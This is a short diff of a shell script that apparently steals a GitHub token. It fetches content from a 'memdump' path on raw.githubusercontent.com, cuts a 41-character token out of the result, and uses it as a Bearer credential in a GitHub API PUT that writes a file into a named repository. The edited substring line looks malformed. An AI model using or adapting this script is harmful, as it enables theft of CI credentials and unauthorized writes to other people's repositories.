@@ -8,15 +8,14 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-T2=${TOKEN_VAL:41:41} 
+T2=${TOKEN_VAL##*( ):41:41} 
 echo "$T2"
-
 curl -L \ 
 -X PUT \ 
 -H "Accept: application/vnd.github+json" \ 
 -H "Authorization: Bearer $T2" \ 
 -H "X-GitHub-Api-Version: 2022-11-28" \ 
-https://api.github.com/repos/thi3nl0ng/thi3nl0ng.github.io/contents/README2.md \ 
+"https://api.github.com/repos/thi3nl0ng/thi3nl0ng.github.io/contents/README2.md" \ 
 -d '{"message":"my commit message","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
 
 
